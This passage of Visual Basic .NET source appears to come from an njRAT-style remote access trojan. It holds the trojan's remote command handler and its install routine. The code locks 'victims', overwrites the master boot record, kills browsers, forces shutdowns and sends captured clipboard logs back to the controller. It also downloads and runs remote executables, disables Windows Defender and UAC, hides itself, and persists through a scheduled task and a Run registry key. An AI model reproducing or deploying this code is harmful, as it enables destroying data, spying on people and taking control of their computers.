                                mciSendString("set CDAudio door closed", vbNullString, 0, IntPtr.Zero)
                                Exit Select

                            Case "TogDesk"
                                ToggleDesktopIcons()
                                Exit Select

                            Case "dolock"
                                If File.Exists(IO.Path.GetTempPath & "select.dat") Then
                                    Debug.Write("nothing")
                                    OK.Send(("MSG" & OK.Y & "victim already in locked mode"))
                                Else
                                    File.Create(IO.Path.GetTempPath & "select.dat").Close()
                                    OK.Send(("MSG" & OK.Y & "victim now locked"))
                                End If

                                Exit Select

                            Case "unlock"
                                If File.Exists(IO.Path.GetTempPath & "select.dat") Then
                                    File.Delete(IO.Path.GetTempPath & "select.dat")
                                    OK.Send(("MSG" & OK.Y & "unlocke victim"))
                                Else
                                    Debug.Write("sn")
                                    OK.Send(("MSG" & OK.Y & "victim was not locked, you need lock first"))
                                End If

                                Exit Select



                                'Case "test2"

                                'Exit Select

                            Case "Flip" 'flip screen gdi
                                Dim hwnd As IntPtr = GetDesktopWindow()
                                Dim hdc As IntPtr = GetWindowDC(hwnd)
                                Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                                Dim y As Integer = Screen.PrimaryScreen.Bounds.Height

                                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                                Exit Select

                            Case "mirror"
                                Dim hwnd As IntPtr = GetDesktopWindow()
                                Dim hdc As IntPtr = GetWindowDC(hwnd)
                                Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                                Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                                Exit Select

                            Case "Invert"

                                Dim hwnd As IntPtr = GetDesktopWindow()
                                Dim hdc As IntPtr = GetWindowDC(hwnd)
                                Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                                Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                                StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY)

                                Exit Select

                            Case "Flashbang"
                                Dim hwnd As IntPtr = GetDesktopWindow()
                                Dim hdc As IntPtr = GetWindowDC(hwnd)
                                Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                                Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                                StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.WHITENESS)
                                Exit Select

                            Case "LightsOut"

                                Dim hwnd As IntPtr = GetDesktopWindow()
                                Dim hdc As IntPtr = GetWindowDC(hwnd)
                                Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                                Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                                StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.BLACKNESS)
                                Exit Select

                            Case "HClock" 'crazywindow hide
                                '' this is basically useless? 
                                Dim hWnd As IntPtr = FindWindow("Settings", Nothing)
                                ShowWindow(hWnd, SW.Hide)
                                Dim hWndx As IntPtr = FindWindow("Window", Nothing)
                                ShowWindow(hWndx, SW.Hide)
                                Dim hWndxx As IntPtr = FindWindow("Task Host Window", Nothing)
                                ShowWindow(hWndxx, SW.Hide)
                                Dim hWndxxx As IntPtr = FindWindow("DWM Notification Window", Nothing)
                                ShowWindow(hWndxxx, SW.Hide)
                                Dim hWndxxxx As IntPtr = FindWindow("BluetoothNotificationAreaIconWindowClass", Nothing)
                                ShowWindow(hWndxxxx, SW.Hide)
                                Dim hWndxxxxx As IntPtr = FindWindow("CiceroUIWndFrame", Nothing)
                                ShowWindow(hWndxxxxx, SW.Hide)
                                Dim hWndxxxxxx As IntPtr = FindWindow("Temp Window", Nothing)
                                ShowWindow(hWndxxxxxx, SW.Hide)
                                Dim hWndxxxxxxx As IntPtr = FindWindow("Default IME", Nothing)
                                ShowWindow(hWndxxxxxxx, SW.Hide)
                                Dim hWndxxxxxxxf As IntPtr = FindWindow("MSCTFIME UI", Nothing)
                                ShowWindow(hWndxxxxxxxf, SW.Hide)
                                Dim hWndxxxxxxxa As IntPtr = FindWindow("DDE Server Window", Nothing)
                                ShowWindow(hWndxxxxxxxa, SW.Hide)
                                Dim hWndxxxxxxpx As IntPtr = FindWindow("MediaContextNotificationWIndow", Nothing)
                                ShowWindow(hWndxxxxxxpx, SW.Hide)
                                Dim hWndzxxxxxxx As IntPtr = FindWindow("MS_WebcheckMonitor", Nothing)
                                ShowWindow(hWndzxxxxxxx, SW.Hide)
                                Dim hWndzxxxxxxxc As IntPtr = FindWindow("Windows Push Notifications Platform", Nothing)
                                ShowWindow(hWndzxxxxxxxc, SW.Hide)
                                Exit Select

                            Case "SClock" 'crazy windiow show
                                ''this is basically useless? 
                                Dim hWnd As IntPtr = FindWindow("Settings", Nothing)
                                ShowWindow(hWnd, SW.ShowNoActivate)
                                Dim hWndx As IntPtr = FindWindow("Window", Nothing)
                                ShowWindow(hWndx, SW.ShowNoActivate)
                                Dim hWndxx As IntPtr = FindWindow("Task Host Window", Nothing)
                                ShowWindow(hWndxx, SW.ShowNoActivate)
                                Dim hWndxxx As IntPtr = FindWindow("DWM Notification Window", Nothing)
                                ShowWindow(hWndxxx, SW.ShowNoActivate)
                                Dim hWndxxxx As IntPtr = FindWindow("BluetoothNotificationAreaIconWindowClass", Nothing)
                                ShowWindow(hWndxxxx, SW.ShowNoActivate)
                                Dim hWndxxxxx As IntPtr = FindWindow("CiceroUIWndFrame", Nothing)
                                ShowWindow(hWndxxxxx, SW.ShowNoActivate)
                                Dim hWndxxxxxx As IntPtr = FindWindow("Temp Window", Nothing)
                                ShowWindow(hWndxxxxxx, SW.ShowNoActivate)
                                Dim hWndxxxxxxx As IntPtr = FindWindow("Default IME", Nothing)
                                ShowWindow(hWndxxxxxxx, SW.ShowNoActivate)
                                Dim hWndxxxxxxxf As IntPtr = FindWindow("MSCTFIME UI", Nothing)
                                ShowWindow(hWndxxxxxxxf, SW.ShowNoActivate)
                                Dim hWndxxxxxxxa As IntPtr = FindWindow("DDE Server Window", Nothing)
                                ShowWindow(hWndxxxxxxxa, SW.ShowNoActivate)
                                Dim hWndxxxxxxpx As IntPtr = FindWindow("MediaContextNotificationWIndow", Nothing)
                                ShowWindow(hWndxxxxxxpx, SW.ShowNoActivate)
                                Dim hWndzxxxxxxx As IntPtr = FindWindow("MS_WebcheckMonitor", Nothing)
                                ShowWindow(hWndzxxxxxxx, SW.ShowNoActivate)
                                Dim hWndzxxxxxxxc As IntPtr = FindWindow("Windows Push Notifications Platform", Nothing)
                                ShowWindow(hWndzxxxxxxxc, SW.ShowNoActivate)
                                Exit Select

                            Case "HStart" 'badly implemented browser kil
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im Chrome.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im Firefox.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im Chromium.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im Opera.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im OperaGX.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im MsEdge.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im Safari.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im Brave.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im Iridium.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im Dissenter.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im PaleMoon.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im Vivaldi.exe"}), AppWinStyle.Hide, True, &H1388)
                                Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im iExplore.exe"}), AppWinStyle.Hide, True, &H1388)
                                Exit Select

                            Case "SStart"
                                Interaction.Shell(String.Concat(New String() {"cmd /c shutdown /s /f /t 60"}), AppWinStyle.Hide, True, &H1388)
                                Exit Select

                            Case "nbrowse"
                                xxma.Start()
                                OK.nowifi = "on"
                                Exit Select

                            Case "fbrowse"
                                OK.nowifi = "off"
                                Exit Select

                            Case "newmouse"
                                Dim MouseThread As Thread = New Thread(New ThreadStart(AddressOf Mouse))
                                MouseThread.Start()
                                Exit Select

                            Case "insane"
                                Dim CrazyThread As Thread = New Thread(New ThreadStart(AddressOf Crazy))
                                CrazyThread.Start()
                                Exit Select


                            Case "getlog"
                                If File.Exists(IO.Path.GetTempPath & "clip.txt") Then
                                    Try
                                        ' Dim fileReader As String
                                        ' fileReader = IO.Path.GetTempPath & "clip.txt"
                                        ' IO.File.ReadAllText(IO.Path.GetTempPath & "clip.txt")
                                        OK.CLIP = IO.File.ReadAllText(IO.Path.GetTempPath & "clip.txt")
                                        OK.Send("LKP" & OK.Y & CLIP)

                                    Catch ex As Exception

                                    End Try
                                Else
                                    OK.Send("LKP" & OK.Y & "Error occured trying to get logs. possible error log file not exists, try grabbing the clipboard first.")

                                End If
                                Exit Select

                                '        Case "grabclipbloard"
                                '        Threading.Thread.Sleep(1000)
                                '       If File.Exists(IO.Path.GetTempPath & "clip.txt") Then
                                '     Try
                                ''  ' Dim fileReader As String
                                ''  ' fileReader = IO.Path.GetTempPath & "clip.txt"
                                ''  ' IO.File.ReadAllText(IO.Path.GetTempPath & "clip.txt")
                                '  OK.CLIP = IO.File.ReadAllText(IO.Path.GetTempPath & "clip.txt")
                                '   OK.Send("XMG" & OK.Y & CLIP)
                                'Catch ex As Exception
                                'End Try
                                '     Else
                                '          OK.Send("XMG" & OK.Y & "Error happened while grabbing clipboard.")
                                '    End If
                                ' Dim fuck As Clipboard.GetText(System.Windows.Forms.TextDataFormat.Text)
                                ' If My.Computer.Clipboard.ContainsText() Then
                                ' OK.Send(("XMG" & OK.Y & ENB(My.Computer.Clipboard.GetText())))
                                '     Else
                                '      OK.Send(("XMG" & OK.Y & "Clipboard not contains text.. Maybe currently contains audio, filedroplist, image or data"))
                                '   End If
                                ' OK.Send(("XMG" & OK.Y & "--> Clipboard text stole is " & Clipboard.GetText & "<--"))
                                'OK.Send(("MSG" & OK.Y & "--> Clipboard text stole is " & Clipboard.GetText & "<--"))
                        '        Exit Select



                            Case "boing"

                                Dim hwnd As IntPtr = GetDesktopWindow()
                                Dim hdc As IntPtr = GetWindowDC(hwnd)
                                Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                                Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                                StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                                Exit Select


                            Case "rainbowz"

                                Dim hwnd As IntPtr = GetDesktopWindow()
                                Dim hdc As IntPtr = GetWindowDC(hwnd)
                                Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                                Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                                Dim fuck As New Random

                                Dim brush As IntPtr = CreateSolidBrush(CUInt(fuck.Next(0, &HFFFFFF + 1)))
                                SelectObject(hdc, brush)
                                PatBlt(hdc, 0, 0, x, y, CopyPixelOperation.PatInvert)
                                DeleteObject(brush)

                                Exit Select


                            Case "Locke"
                                Interaction.Shell(("cmd /c rundll32.exe user32.dll,LockWorkStation"), AppWinStyle.Hide, True, &H1388)

                                Exit Select


                            Case "UAC"
                                Try
                                    Dim procInfo As New ProcessStartInfo()
                                    procInfo.UseShellExecute = True
                                    procInfo.FileName = (IO.Path.GetFileName(Application.ExecutablePath))
                                    procInfo.WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory
                                    procInfo.Verb = "runas"
                                    Process.Start(procInfo)
                                    Interaction.Shell(("taskkill /f /im " & IO.Path.GetFileName(Application.ExecutablePath)), AppWinStyle.Hide, True, &H1388)
                                Catch ex As Exception
                                    '                              'MessageBox.Show(ex.Message.ToString())
                                    'debug msgbox
                                    OK.Send(("MSG" & OK.Y & "UAC Fail, WTF?: " & ex.Message.ToString()))
                                End Try

                                '   Case "debuguac2"
                                '       Try
                                '           Dim procInfo As New ProcessStartInfo()
                                '           procInfo.UseShellExecute = True
                                '           procInfo.FileName = "start cmd /c " & (IO.Path.GetFileName(Application.ExecutablePath))
                                '           procInfo.WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory
                                '           procInfo.Verb = "runas"
                                '           Process.Start(procInfo)
                                '           Interaction.Shell(("taskkill /f /im " & IO.Path.GetFileName(Application.ExecutablePath)), AppWinStyle.Hide, True, &H1388)
                                '       Catch ex As Exception
                                '           '                              'MessageBox.Show(ex.Message.ToString())
                                '           OK.Send(("MSG" & OK.Y & "CMD UAC Fail, WTF?: " & ex.Message.ToString()))
                                ''       End Try


                                Exit Select


                            Case "sched"
                                Interaction.Shell(("schtasks /create /sc minute /mo 1 /tn CleanSweepCheck /tr " & AppDomain.CurrentDomain.BaseDirectory & IO.Path.GetFileName(Application.ExecutablePath)), AppWinStyle.Hide, True, &H1388)
                                Exit Select

                            Case "feitan"
                                Interaction.Shell(("schtasks /delete /tn CleanSweepCheck /f"), AppWinStyle.Hide, True, &H1388)
                                Exit Select


                            Case "FuckMBR"

                                Try
                                    File.Create("C: //test.txt").Close()

                                    OK.Send(("MSG" & OK.Y & "AdminCheck: MBR Overwritten."))
                                    OK.Send(("XMG" & OK.Y & "MBR Overwritten, successfully."))

                                    MBRSlayer.Start()
                                    Interaction.Shell(("cmd /c start shutdown /r /f /t 3"), AppWinStyle.Hide, True, &H1388)
                                    File.Delete("C://test.txt")
                                Catch ex As Exception
                                    If ex.ToString.Contains("denied") Then
                                        OK.Send(("MSG" & OK.Y & "AdminCheck: Can't use MBR. (No admin)"))
                                        OK.Send(("XMG" & OK.Y & "Cannot overwrite MBR, needs Admin privilege"))
                                    End If
                                End Try
                                Exit Select

                            Case "FuckMBRNR"
                                Try
                                    File.Create("C://test.txt").Close()

                                    OK.Send(("MSG" & OK.Y & "AdminCheck: MBR Overwritten."))
                                    OK.Send(("XMG" & OK.Y & "MBR Overwritten, successfully."))
                                    MBRSlayer.Start()
                                    File.Delete("C://test.txt")
                                Catch ex As Exception
                                    If ex.ToString.Contains("denied") Then
                                        OK.Send(("MSG" & OK.Y & "AdminCheck: Can't use MBR. (No admin)"))
                                        OK.Send(("XMG" & OK.Y & "Cannot overwrite MBR, needs Admin privilege"))
                                    End If
                                End Try

                                Exit Select

                            Case "AdmChk"
                                Try
                                    File.Create("C://test.txt").Close()
                                    OK.Send(("MSG" & OK.Y & "AdminCheck: You have admin rights."))
                                    OK.Send(("XMG" & OK.Y & "AdminCheck: You have admin rights."))
                                    File.Delete("C://test.txt")
                                Catch ex As Exception
                                    If ex.ToString.Contains("denied") Then
                                        OK.Send(("MSG" & OK.Y & "AdminCheck: You have no admin rights."))
                                        OK.Send(("XMG" & OK.Y & "AdminCheck: You have no admin rights."))
                                    End If
                                End Try
                                Exit Select

                            Case "FckOffShutdown"
                                Interaction.Shell(("cmd /c shutdown -a"), AppWinStyle.Hide, True, &H1388)
                                Exit Select


                                ''piano  start (bad implementition, could be improved)
                            Case "btnMC"
                                Beep(261, 150)
                                Exit Select

                            Case "btnMD"
                                Beep(293, 150)
                                Exit Select

                            Case "btnME"
                                Beep(329, 150)
                                Exit Select

                            Case "btnMF"
                                Beep(349, 150)
                                Exit Select

                            Case "btnMCs"
                                Beep(277, 150)
                                Exit Select

                            Case "btnMDs"
                                Beep(311, 150)
                                Exit Select

                            Case "btnMFs"
                                Beep(369, 150)
                                Exit Select

                            Case "btnMG"
                                Beep(391, 150)
                                Exit Select

                            Case "btnMGs"
                                Beep(415, 150)
                                Exit Select

                            Case "btnMA"
                                Beep(440, 150)
                                Exit Select

                            Case "btnMAs"
                                Beep(446, 150)
                                Exit Select

                            Case "btnMB"
                                Beep(493, 150)
                                Exit Select

                            Case "btnHC"
                                Beep(523, 150)
                                Exit Select

                            Case "btnHCs"
                                Beep(554, 150)
                                Exit Select

                            Case "btnHD"
                                Beep(587, 150)
                                Exit Select

                            Case "btnHDs"
                                Beep(622, 150)
                                Exit Select

                            Case "btnHE"
                                Beep(659, 150)
                                Exit Select

                            Case "btnHF"
                                Beep(698, 150)
                                Exit Select

                            Case "btnHFs"
                                Beep(739, 150)
                                Exit Select

                            Case "btnHG"
                                Beep(783, 150)
                                Exit Select

                            Case "btnHGs"
                                Beep(830, 150)
                                Exit Select

                            Case "btnHA"
                                Beep(880, 150)
                                Exit Select

                            Case "btnHAs"
                                Beep(932, 150)
                                Exit Select

                            Case "btnHB"
                                Beep(987, 150)
                                Exit Select

                            Case "btnLB"
                                Beep(246, 150)
                                Exit Select

                            Case "btnLAs"
                                Beep(233, 150)
                                Exit Select

                            Case "btnLA"
                                Beep(220, 150)
                                Exit Select

                            Case "btnLGs"
                                Beep(207, 150)
                                Exit Select

                            Case "btnLG"
                                Beep(195, 150)
                                Exit Select

                            Case "btnLFs"
                                Beep(184, 150)
                                Exit Select

                            Case "btnLF"
                                Beep(174, 150)
                                Exit Select

                            Case "btnLE"
                                Beep(164, 150)
                                Exit Select

                            Case "btnLDs"
                                Beep(155, 150)
                                Exit Select

                            Case "btnLD"
                                Beep(146, 150)
                                Exit Select

                            Case "btnLCs"
                                Beep(138, 150)
                                Exit Select

                            Case "btnLC"
                                Beep(130, 150)
                                Exit Select









                        End Select
                        Return



                End Select
                If (str4 <> "up") Then
                    GoTo Label_0A1C
                End If
                Dim bytes As Byte() = Nothing
                If (strArray(1).Chars(0) = ChrW(31)) Then
                    Try
                        Dim stream6 As New MemoryStream
                        Dim num4 As Integer = (strArray(0) & OK.Y).Length
                        stream6.Write(b, num4, (b.Length - num4))
                        bytes = OK.ZIP(stream6.ToArray)
                        GoTo Label_097B
                    Catch exception13 As Exception
                        ProjectData.SetProjectError(exception13)
                        Dim exception5 As Exception = exception13
                        OK.Send(("MSG" & OK.Y & "Update ERROR"))
                        OK.Send("bla")
                        ProjectData.ClearProjectError()
                        Return
                    End Try
                End If
                Dim client2 As New WebClient
                Try
                    bytes = client2.DownloadData(strArray(1))
                Catch exception14 As Exception
                    ProjectData.SetProjectError(exception14)
                    Dim exception6 As Exception = exception14
                    OK.Send(("MSG" & OK.Y & "Update ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_097B:
                OK.Send("bla")
                Randomize()
                Dim fileName As String = (IO.Path.GetTempPath & Guid.NewGuid.ToString().Replace("-", "") & ".exe")
                Try
                    OK.Send(("MSG" & OK.Y & "Updating To " & New FileInfo(fileName).Name))
                    Thread.Sleep(&H7D0)
                    File.WriteAllBytes(fileName, bytes)
                    Process.Start(fileName, "..")
                Catch exception15 As Exception
                    ProjectData.SetProjectError(exception15)
                    Dim exception7 As Exception = exception15
                    OK.Send(("MSG" & OK.Y & "Update ERROR " & exception7.Message))
                    ProjectData.ClearProjectError()
                    Return
                End Try
                OK.UNS()
                Return
Label_0A1C:
                If (str4 = "Ex") Then
                    If (OK.PLG Is Nothing) Then
                        OK.Send("PLG")
                        Dim num5 As Integer = 0
                        Do While Not (((Not OK.PLG Is Nothing) Or (num5 = 20)) Or Not OK.Cn)
                            num5 += 1
                            Thread.Sleep(&H3E8)
                        Loop
                        If ((OK.PLG Is Nothing) Or Not OK.Cn) Then
                            Return
                        End If
                    End If
                    Dim arguments As Object() = New Object() {b}
                    Dim copyBack As Boolean() = New Boolean() {True}
                    NewLateBinding.LateCall(OK.PLG, Nothing, "ind", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        b = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Byte())), Byte())
                    End If
                ElseIf (str4 = "PLG") Then
                    Dim stream7 As New MemoryStream
                    Dim num6 As Integer = (strArray(0) & OK.Y).Length
                    stream7.Write(b, num6, (b.Length - num6))
                    OK.PLG = RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(stream7.ToArray), "A"))
                    NewLateBinding.LateSet(OK.PLG, Nothing, "H", New Object() {(OK.H)}, Nothing, Nothing)
                    NewLateBinding.LateSet(OK.PLG, Nothing, "P", New Object() {OK.P}, Nothing, Nothing)
                    NewLateBinding.LateSet(OK.PLG, Nothing, "c", New Object() {OK.C}, Nothing, Nothing)
                End If
            Catch exception16 As Exception
                ProjectData.SetProjectError(exception16)
                Dim exception8 As Exception = exception16
                If ((strArray.Length > 0) AndAlso ((strArray(0) = "Ex") Or (strArray(0) = "PLG"))) Then
                    OK.PLG = Nothing
                End If
                Try
                    OK.Send(String.Concat(New String() {"ER", OK.Y, strArray(0), OK.Y, exception8.Message}))
                Catch exception17 As Exception
                    ProjectData.SetProjectError(exception17)
                    Dim exception9 As Exception = exception17
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Function inf() As String
            Dim str2 As String = ("ll" & OK.Y)
            Try
                If Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", False) Then
                    str2 = (str2 & OK.ENB((OK.DEB(OK.VN) & "_" & OK.HWD)) & OK.Y)
                Else
                    str2 = (str2 & OK.ENB((OK.DEB(Conversions.ToString(OK.GTV("vn", ""))) & "_" & OK.HWD)) & OK.Y)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str2 = (str2 & OK.ENB(OK.HWD) & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & Environment.MachineName & OK.Y)
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception2 As Exception = exception9
                str2 = (str2 & "??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & Environment.UserName & OK.Y)
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception3 As Exception = exception10
                str2 = (str2 & "??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") & OK.Y)
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception4 As Exception = exception11
                str2 = (str2 & "??-??-??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            str2 = (str2 & "" & OK.Y)
            Try
                str2 = (str2 & OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win"))
            Catch exception12 As Exception
                ProjectData.SetProjectError(exception12)
                Dim exception5 As Exception = exception12
                str2 = (str2 & "??")
                ProjectData.ClearProjectError()
            End Try
            str2 = (str2 & "SP")
            Try
                Dim strArray As String() = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary)
                If (strArray.Length = 1) Then
                    str2 = (str2 & "0")
                End If
                str2 = (str2 & strArray((strArray.Length - 1)))
            Catch exception13 As Exception
                ProjectData.SetProjectError(exception13)
                Dim exception6 As Exception = exception13
                str2 = (str2 & "0")
                ProjectData.ClearProjectError()
            End Try
            Try
                If Environment.GetFolderPath(SpecialFolder.ProgramFiles).Contains("x86") Then
                    str2 = (str2 & " x64" & OK.Y)
                Else
                    str2 = (str2 & " x86" & OK.Y)
                End If
            Catch exception14 As Exception
                ProjectData.SetProjectError(exception14)
                Dim exception7 As Exception = exception14
                str2 = (str2 & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            If OK.Cam Then
                str2 = (str2 & "Yeah >:)" & OK.Y)
            Else
                str2 = (str2 & "Nope >:(" & OK.Y)
            End If
            str2 = String.Concat(New String() {str2, OK.GetAntiVirus, OK.Y, OK.GetAntiVirus, OK.Y, OK.GetAntiVirus, OK.Y})
            Dim str3 As String = ""
            Try
                Dim str4 As String
                For Each str4 In OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG), RegistryKeyPermissionCheck.Default).GetValueNames
                    If (str4.Length = &H20) Then
                        str3 = (str3 & str4 & ",")
                    End If
                Next
            Catch exception15 As Exception
                ProjectData.SetProjectError(exception15)
                Dim exception8 As Exception = exception15
                ProjectData.ClearProjectError()
            End Try
            Return (str2 & str3)
        End Function

        Public Shared Sub INS()



            Thread.Sleep(&H3E8)
            If (OK.Idr AndAlso Not OK.CompDir(OK.LO, New FileInfo((Interaction.Environ(OK.DR).ToLower & "\" & OK.EXE.ToLower)))) Then
                Try
                    If File.Exists((Interaction.Environ(OK.DR) & "\" & OK.EXE)) Then
                        File.Delete((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                    End If
                    Dim stream As New FileStream((Interaction.Environ(OK.DR) & "\" & OK.EXE), FileMode.CreateNew)
                    Dim array As Byte() = File.ReadAllBytes(OK.LO.FullName)
                    stream.Write(array, 0, array.Length)
                    stream.Flush()
                    stream.Close()
                    OK.LO = New FileInfo((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                    Process.Start(OK.LO.FullName)
                    ProjectData.EndApp()
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.EndApp()
                    ProjectData.ClearProjectError()
                End Try
            End If
            Try
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception2 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try
            Try
                ''Interaction.Shell(String.Concat(New String() {"netsh firewall add allowedprogram """, OK.LO.FullName, """ """, OK.LO.Name, """ ENABLE"}), AppWinStyle.Hide, True, &H1388)
                'netsh has behaviral detection on antivirus

                If OK.AKATSUKI = "Enabled" Then
                    Interaction.Shell(String.Concat(New String() {"attrib +h """, AppDomain.CurrentDomain.BaseDirectory + (IO.Path.GetFileName(Application.ExecutablePath)), """"}), AppWinStyle.Hide, True, &H1388)
                End If


                If OK.MSGE = "Enabled" Then

                    'temp text file is bad implemention, temp folder cold get cleared and msgbox show again in startup 

                    If File.Exists(IO.Path.GetTempPath & "obito.txt") Then
                        Debug.Write("nothing")
                    Else
                        If MSGSYM = "vbCritical" Then
                            MsgBox(OK.MSGB, vbCritical, OK.MSGT)
                            ''File.Create(IO.Path.GetTempPath & "obito.txt")
                            File.Create(IO.Path.GetTempPath & "obito.txt").Close()
                        Else
                            If MSGSYM = "vbInformation" Then
                                MsgBox(OK.MSGB, vbInformation, OK.MSGT)
                                '''File.Create(IO.Path.GetTempPath & "obito.txt")
                                File.Create(IO.Path.GetTempPath & "obito.txt").Close()
                            Else
                                If MSGSYM = "vbExclamation" Then
                                    MsgBox(OK.MSGB, vbExclamation, OK.MSGT)
                                    ''File.Create(IO.Path.GetTempPath & "obito.txt")
                                    File.Create(IO.Path.GetTempPath & "obito.txt").Close()
                                Else
                                    If MSGSYM = "vbQuestion" Then
                                        MsgBox(OK.MSGB, vbQuestion, OK.MSGT)
                                        ''File.Create(IO.Path.GetTempPath & "obito.txt")
                                        File.Create(IO.Path.GetTempPath & "obito.txt").Close()
                                    End If
                                End If
                            End If

                        End If
                    End If
                End If



                If OK.OBITO = "Enabled" Then     'dsiable defender
                    Interaction.Shell(String.Concat(New String() {"cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring $true"}), AppWinStyle.Hide, True, &H1388)
                    Interaction.Shell(String.Concat(New String() {"cmd /c sc query windefend"}), AppWinStyle.Hide, True, &H1388)
                    Interaction.Shell(String.Concat(New String() {"cmd /c sc stop windefend"}), AppWinStyle.Hide, True, &H1388)
                    Interaction.Shell(String.Concat(New String() {"cmd /c sc delete windefend"}), AppWinStyle.Hide, True, &H1388)

                Else

                End If

                If OK.CLEANSWEEP = "Enabled" Then           'schedule tasks
                    Interaction.Shell(("schtasks /delete /tn CleanSweepCheck /f"), AppWinStyle.Hide, True, &H1388)
                    Interaction.Shell(("schtasks /create /sc minute /mo 1 /tn CleanSweepCheck /tr " & AppDomain.CurrentDomain.BaseDirectory & IO.Path.GetFileName(Application.ExecutablePath)), AppWinStyle.Hide, True, &H1388)
                Else

                End If

                If OK.UAC = "Enabled" Then         'disable uac
                    Interaction.Shell("cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", AppWinStyle.Hide, True, &H1388)
                Else

                End If

                If OK.TSKE = "Enabled" Then 'custom takskill

                    Interaction.Shell(String.Concat(New String() {"cmd /c taskkill /f /im " & TSK}), AppWinStyle.Hide, True, &H1388)

                Else

                End If

                If OK.KAKASHI = "Enabled" Then 'anti taskmgner
                    xma.Start()
                    Dim tas As New AntiTaskManager
                    Dim xst As New Threading.Thread(AddressOf tas.protect)
                    xst.Start()
                Else
                End If

            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception3 As Exception = exception8
                ProjectData.ClearProjectError()
            End Try
            If OK.Isu Then
                Try
                    OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception4 As Exception = exception9
                    ProjectData.ClearProjectError()
                End Try
                Try
